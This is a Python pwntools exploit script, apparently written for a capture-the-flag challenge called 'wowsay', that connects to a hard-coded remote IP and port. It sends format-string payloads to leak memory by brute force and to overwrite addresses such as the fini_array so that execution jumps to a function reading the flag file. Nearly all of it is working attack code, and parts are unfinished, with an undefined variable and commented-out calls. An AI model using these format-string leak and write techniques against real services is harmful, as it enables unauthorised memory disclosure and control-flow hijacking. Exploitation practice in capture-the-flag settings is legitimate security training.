#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

### todo limpiarlo un poco

libc = ELF("./libc.so.6", checksec=False)

context.log_level = 'error'

gdbscript = '''

continue
'''.format(**locals())

FINI_ARRAY = 0x403e00 # -> pos 30
FINI_ARRAY_ENTRY_POS = 30
win= 0x401246 + 21 # ?
MAIN = 0x401352 # probably? -> pos 23
flag = 0x402016
# 0x402016 -> "wowsay/flag.txt"
def logleak(name: str, addr: int): print(f"[*] " + name + " = %#x" % addr)

def brute_leak():
    leaks = []
    with open("code.bin", "wb+") as f:
        for i in range(0, 0x50, 8):
            io = remote("18.212.136.134", 1337)


            #payload = f'%{i}$p'.encode()
            #payload = payload.ljust(8, b'\xCC')
            #payload += flat(0x404000) + flat(0x0)
            start_addr = 0x404000

            payload = b'%7$s'
            payload = payload.ljust(8, b'X')
            payload += flat(start_addr + i) 
            payload = payload.ljust(0x20, b'\x00')

            io.sendlineafter(b'say: ', payload)   

            io.recvuntil(b'Wow: ')

            try:
                leak = io.recvline(timeout=1).split(b'X' *4)[0]

               

            #__libc_start_main = int(leak, 16) - 234 - 0x22160
                addr = hex(u64(leak.ljust(8, b'\x00')))
                print(f"[+] 0x{start_addr + i:x} => {addr}")
                leaks.append(leak.split(b'X' *4)[0])  
                
               # f.write(leak.split(b'X' * 4)[0].ljust(len(leak) % 16, b'\x00'))


            except:
                continue

            io.close()
    print([hex(u64(i.ljust(8, b'\x00'))) for i in leaks])

def stack_write():

    io = remote("18.212.136.134", 1337)

    payload = f'%{0x11c7}c%30$hn'.encode()
    print(payload)
    io.sendlineafter(b'say: ', payload)

   
    io.interactive()

def brute_leak_stack():

    with open("code.bin", "wb+") as f:
        for i in range(100):
            io = remote("18.212.136.134", 1337)


            payload = f'%{i}$p'.encode()
            payload = payload.ljust(0x10, b'\x00')
            payload += flat(0x404018) + flat(0x0)
            start_addr = win

            #payload = f'%{i}$p'.encode()
            #payload = payload.ljust(0x20, b'\x00')

            io.sendlineafter(b'say: ', payload)   

            io.recvuntil(b'Wow: ')

            # 22 25 26 29 37 38

            try:
                leak = io.recvline(timeout=1)
                print(f"[+] {i} => {leak}")
                leaks.append(leak)
            except:
                continue

            io.close()


def arb_write():
    io = remote("18.212.136.134", 1337)

    # 000 010 020 030 040 048 050

    payload = f'%{0x11c6}c%8$hn'.encode()
    payload = payload.ljust(0x10, b'\x41')
    payload += flat(0x404048) + flat(0x0)
 
    io.sendlineafter(b'say: ', payload)

    print(payload)
    io.interactive()

brute_leak()
#stack_write()
#brute_leak_stack()
#exp()
#arb_write()
